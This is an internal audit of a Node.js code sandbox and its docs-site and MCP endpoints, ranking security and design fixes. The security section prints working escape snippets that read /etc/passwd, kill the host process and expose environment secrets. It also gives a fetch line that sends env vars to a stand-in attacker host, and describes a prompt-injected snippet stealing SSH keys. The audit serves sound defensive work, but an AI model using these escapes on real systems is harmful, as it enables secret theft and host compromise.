# AE Audit — `@directive-run/sandbox` (Phase A)

**Date:** 2026-06-07
**Versions audited:** `@directive-run/sandbox@0.1.0` (shipped 2026-06-06), `@directive-run/sandbox@0.2.0` (publishing — allowlist widening, no security changes)
**Reviewers:** 5 parallel AE lenses (security/red-team, architecture, agent-UX, DX, domain-correctness)
**Verdict aggregate:** **D / B+ / B- / B- / C+** — NEEDS FIXES across all lenses; **security findings are exploitable in production today.**

---

## Critical situation summary

The AST allowlist validator that the README claims is "the actual security boundary" **is bypassed in a single straight-line expression** because the validator explicitly skips identifiers in property-access position. `globalThis.process.exit()`, `Reflect.get(globalThis, "process")`, and `({}).constructor.constructor("return process")()` all work today and reach the host process unimpeded.

**Exposure surfaces:**

- **`directive.run/api/run-sandbox`** (Vercel) — anonymous attackers can drain `process.env`, hit AWS IMDS via reachable `fetch`, lateral SSRF. No rate-limit, no CSRF check, no Origin allowlist. Public-facing.
- **`@directive-run/mcp@0.5.0`** — local-trust context, but a malicious snippet in a Claude Desktop conversation can read `~/.ssh/`, write to `$HOME`, and exfiltrate via any `@directive-run/query`-reachable fetch. Lower severity than Vercel but real.

`@directive-run/sandbox@0.2.0` (allowlist widen, currently in the Release pipeline) introduces no security regressions but ALSO ships no fixes — same bypass.

---

## P0 — block release / patch immediately

### P0-S1. AST property-access bypass — total escape (security)

**Source:** `packages/sandbox/src/validator.ts:316-322`
**Description:** `checkGlobalIdentifiers` walks every Identifier; when an Identifier's parent is a `PropertyAccessExpression` and the Identifier is the `.name`, the denylist check is skipped (intended to prevent `{module: x}` false positives). This skip is total — `globalThis.process`, `globalThis.fetch`, `globalThis.Buffer`, `obj.constructor`, etc. all pass through.

**Working PoCs:**

```ts
// (1) Direct globalThis escape — reads /etc/passwd
import { createSystem } from "@directive-run/core";
const fs = globalThis.process.mainModule.require("node:fs");
console.log(fs.readFileSync("/etc/passwd", "utf8"));

// (2) Reflect.get smuggle
const proc = Reflect.get(globalThis, "process");
proc.kill(proc.pid, "SIGTERM"); // kills the host

// (3) Function constructor smuggle
const F = ({}).constructor.constructor;
const proc = F("return process")();
console.log(proc.env);
```

**Impact (Vercel):** Anonymous POST to `/api/run-sandbox` exfiltrates `OPENAI_API_KEY`, `VERCEL_*`, `DATABASE_URL`, any other env. Reachable via `globalThis.fetch(attacker, {body: JSON.stringify(globalThis.process.env)})`.

**Impact (MCP):** Local-trust context. Malicious snippet (e.g. from a hostile prompt-injection in a doc the LLM read) reads `~/.ssh/id_rsa`, harvests git credentials, etc.

**Fix:**
1. Enforce DENIED_GLOBALS on PropertyAccessExpression `.name` when the receiver text is `globalThis`, `Object`, `Reflect`, `Object.prototype`, or any other allowed global.
2. Forbid `.constructor` access anywhere (no legitimate Directive use).
3. Forbid `Reflect.get` / `Reflect.has` / `Object.getOwnPropertyDescriptor` calls with first arg `globalThis`.
4. Reject bracket access on `globalThis` with a string literal (`globalThis["proc" + "ess"]` is harder to AST-detect; consider a `globalThis[...]` total ban).
5. Add `Function` to deny-list under all access patterns (`new Function`, `Function(...)`, `obj.constructor.constructor`).

### P0-S2. SSRF + secret exfiltration via `@directive-run/query`'s internal fetch (security)

**Source:** `packages/query/src/create-base-query.ts:204` + `packages/ai/src/agent-utils.ts:235-278`
**Description:** The validator allows `@directive-run/query`. The package's internal `fetch` calls run inside the package's module body — the validator never sees them. A snippet that calls `createBaseQuery({baseUrl: "http://attacker"})` triggers an outbound HTTP request from the worker. On Vercel, this is SSRF from a privileged egress (AWS IMDS, internal admin endpoints, etc.).

**Fix:**
1. **Vercel surface:** outbound fetch wrapper that blocks RFC-1918 ranges, `169.254.169.254`, `[::1]`, `localhost`, any non-public IP.
2. **MCP surface:** same wrapper but lower priority (local trust).
3. **OR**: remove `@directive-run/query` and `@directive-run/ai` from the allowlist on the Vercel server-side wrapper; keep allowed on MCP. Two configurations of the same sandbox, different denylists per environment.

### P0-S3. No rate-limit / Origin check / CSRF on `/api/run-sandbox` (security)

**Source:** `directive-docs/src/app/api/run-sandbox/route.ts`
**Description:** Anonymous POST endpoint. No rate limit. No Origin check. Combined with P0-S1, any cross-origin site can POST exfil snippets.

**Fix:**
1. Add IP rate-limit (Upstash KV / Vercel KV: 5 calls/min/IP).
2. Add Origin allowlist (`directive.run`, `www.directive.run`, `localhost:3000`).
3. Add Turnstile / hCaptcha challenge for >N calls/minute from same IP.
4. Cap concurrent in-flight calls at the function-instance level.

### P0-A1. Temp-file location blocks Vercel deploy (architecture)

**Source:** `packages/sandbox/src/host.ts:91-104`
**Description:** `writeBundleToTemp` uses `mkdtempSync` inside `node_modules/@directive-run/sandbox/.sandbox-tmp-XXX/`. Vercel + AWS Lambda + Cloud Run + Workers all have read-only FS outside `/tmp`. The `directive-docs` `/api/run-sandbox` route may currently work on Vercel only because of some specific deployment-time copy behavior — but it's incidental.

**Fix:** Synthesize an `imports` map next to a `/tmp/.../bundle.mjs` file pointing at the host's resolved `@directive-run/*` paths. OR adopt the AST-injection approach proposed by the architecture lens, removing the need for temp files entirely.

### P0-D1. Tool description LIES about allowlist (agent-UX)

**Source:** `packages/mcp/src/server.ts` (`run_in_sandbox` description) + `packages/mcp/README.md` Playground section
**Description:** The MCP tool description and the README both claim the allowlist is `@directive-run/{core,ai,query}`. The actual allowlist (post-0.2.0) is 16 packages. An LLM reading the description will pre-emptively reject valid React/Vue/AI orchestrator snippets.

**Fix:** Update tool description + README with the full allowlist. Add the foot-gun line: "react/vue/svelte/solid/lit import OK but their runtime hooks throw in Node — use `playground_link` for UI demos."

### P0-DM1. Console.log of `system.facts` outputs `{}` instead of facts (domain)

**Source:** `packages/sandbox/src/worker.ts:54-63`
**Description:** Worker formats console args via `JSON.stringify`. `system.facts` is a Proxy over `FactsStore`; JSON.stringify produces `"{}"`. Users see `[log] [start] facts: {}` in the transcript and assume the engine is broken — while `result.facts` correctly shows the snapshot. Two contradictory views.

**Fix:** Replace `JSON.stringify(arg)` in `captureConsole` with a Directive-aware serializer that detects facts proxies via `util.inspect.custom` or by reading `.$store?.toObject()`. Fallback to JSON.stringify for non-Directive values.

### P0-DM2. Derivations missing from snapshot (domain)

**Source:** `packages/sandbox/src/worker.ts` + `packages/core/src/core/facts.ts:493`
**Description:** `$store.toObject()` returns only facts. A module whose primary output is a derivation (`status`, `isReady`, `total`, etc.) returns `facts: {input: "x"}` and the derived value is invisible. Half the runtime is missing from the transcript.

**Fix:** Add `derived: Record<string, unknown>` to `SandboxResult`. Walk the system's derivation registry post-settle and snapshot each.

---

## P1 — patch in next minor

### Security P1s
- **P1-S1:** Buffer reachable via `globalThis.Buffer` — `Buffer.alloc(2**30)` allocates 1 GB outside the worker's heap cap. Resource limits are V8-heap-only.
- **P1-S2:** Cross-call worker pooling explicitly avoided — confirm in tests that worker process state never leaks between calls. Currently safe; document.
- **P1-S3:** `import.meta.url` is reachable and leaks the bundle's absolute path (reconnaissance value).
- **P1-S4:** `stderr: false` on the worker silences fatal heap errors — debugging this in prod will be miserable.

### Architecture P1s
- **P1-A1:** Early-capture regex (`bundler.ts:59`) is brittle against esbuild output changes. AST-level rewrite via ts-morph (already loaded) is more durable.
- **P1-A2:** Single `Sandbox` class with lifecycle (`validate → bundle → execute → cleanup`) supports v0.3 needs (bundle caching, `validateOnly`, AbortSignal).
- **P1-A3:** Extract `@directive-run/worker-utils` shared with `@directive-run/lint`'s runner — currently duplicated worker-spawn-with-timeout pattern.

### Agent-UX P1s
- **P1-AU1:** Tag errors with `[validation]` / `[runtime]` / `[bundle]` / `[timeout]` prefixes so the LLM can branch programmatically.
- **P1-AU2:** Add `phase: "validation" | "bundle" | "runtime" | "complete"` to `SandboxResult`.
- **P1-AU3:** Cross-reference tool descriptions: `fix_code` / `get_example` / `review_source` should mention `run_in_sandbox` ("Pair with run_in_sandbox to verify the result behaves correctly").
- **P1-AU4:** `clampedTimeoutMs` field when user input was clamped (current silent clamping).

### DX P1s
- **P1-DX1:** Install section in README. Peer-dep warning (esbuild + ts-morph not auto-installed in environments that don't vendor them).
- **P1-DX2:** Propagate `SandboxErrorCode` to `result.errorCode` for programmatic routing (CI gates etc.).
- **P1-DX3:** `XOR`-discriminated `RunInSandboxInput` type so `{source, files}` together is a TS error.
- **P1-DX4:** `@internal` JSDoc on `./worker` subpath + README warning.
- **P1-DX5:** Latency / install size disclosure (esbuild ~10 MB + ts-morph ~25 MB).

### Domain P1s
- **P1-DM1:** Namespaced systems leak `::` separator in `result.facts` keys. Apply `denormalizeFlatKeys` (already exists in `system.ts:675`) before returning.
- **P1-DM2:** Effects with `Promise.resolve().then(...)` may log AFTER settle. Drain microtasks via `await new Promise(r => setImmediate(r))` before snapshot.
- **P1-DM3:** Add `warnings: string[]` for `start()`/`settle()`-not-called, multi-system detected, etc.
- **P1-DM4:** Early-capture regex assumes binding name `system`. Real users write `const app = createSystem(...)`. Either widen regex or document loudly.

---

## P2 — hardening / cosmetic

- **P2-S1:** Validator's `stderr: false` makes worker debugging hard.
- **P2-A1:** Remove vestigial `restoreConsole()` in worker (worker dies after one message; restore is dead code).
- **P2-AU1:** Add `activity: "no-op" | "logged" | "facts-changed" | "errors"` derived signal to result.
- **P2-DX1:** AbortSignal support in `runInSandbox(input, {signal})`.
- **P2-DX2:** Generic `SandboxResult<TFacts>` so consumers can narrow.
- **P2-DM1:** Multi-system detection — reject snippets with multiple `createSystem` calls (current regex silently picks the first).

---

## Deferred / acknowledged

- Worker pooling (cold-start is 5ms; pooling adds complexity for sub-ms wins).
- Loader hooks / `vm.SourceTextModule` (temp-file is the right call for v1).
- The "strict-by-default, widen on real failure" allowlist stance is correct.

---

## Incident-response priorities (action order)

1. **TODAY:** Push a hotfix that closes P0-S1 (property-access bypass). Doesn't need to be perfect — even a coarse `globalThis[X]` / `globalThis.X` ban prevents the trivial exploit chains.
2. **TODAY:** Add IP rate-limit to `/api/run-sandbox` via Vercel KV / Upstash + Origin allowlist. Or pull the route temporarily until P0-S1 ships.
3. **TODAY:** Fix the README + tool description allowlist lie (P0-D1) — trivial and the LLM is currently being misled.
4. **THIS WEEK:** Close P0-S2 (SSRF via @directive-run/query fetch) — outbound fetch allowlist.
5. **THIS WEEK:** Fix P0-A1 (temp-file location) before more deploy targets hit it.
6. **THIS WEEK:** Close P0-DM1 + P0-DM2 (console.log facts honesty + derivations in snapshot).
7. **NEXT MINOR:** All P1s.
8. **NEXT MAJOR (0.3.0):** All P2s.

---

## Per-lens grades

| Lens | Grade | Verdict |
|---|---|---|
| Security / Red-Team | **D** | NEEDS FIXES (BLOCK 0.2.0 PUBLISH; ship 0.3.0 with hardening) |
| Architecture | **B+** | NEEDS FIXES before v1.0 |
| Agent-UX | **B-** | NEEDS FIXES (tool description lies — easy fix, big impact) |
| DX | **B-** | NEEDS FIXES before external adoption |
| Domain-Correctness | **C+** | NEEDS FIXES (transcript half-blind to Directive surface) |

---

## What we promise vs. what we deliver — for the threat-model doc

| Threat class | DEFENDED | NOT DEFENDED |
|---|---|---|
| `import "node:fs"`, `import "express"` | ✅ allowlist | |
| `import "@directive-run/cli"` etc. | ✅ denylist | |
| Free-identifier `process`, `eval`, `fetch` | ✅ denylist | |
| `new Function("…")` | ✅ regex | |
| Top-level `await import("…")` | ✅ dynamic-import check | |
| `obj.process` false-positive | ✅ property-access skip | |
| **`globalThis.process` access** | | ❌ property-access skip is total |
| **`Reflect.get(globalThis, "process")`** | | ❌ no string-literal inspection |
| **`({}).constructor.constructor` Function smuggle** | | ❌ no `.constructor` guard |
| **`globalThis.setTimeout` / `globalThis.Buffer`** | | ❌ same class |
| **SSRF via `@directive-run/query` internal fetch** | | ❌ external module bodies not inspected |
| **Env-var exfil from Vercel** | | ❌ no egress wrapper, no rate-limit |
| Buffer allocation outside heap cap | | ❌ resource limits are V8-heap-only |
| Wall-clock overrun | ✅ `worker.terminate()` | |
| Cross-call state carry-over | ✅ fresh worker per call | |
| Worker → host memory poisoning | ✅ postMessage structured clone | |

The honest summary: **today's validator defends against naïve free-identifier escapes only.** The "property-name is just a label" exemption (intended to prevent `{module: x}` false positives) over-shoots into a full bypass of the denylist.
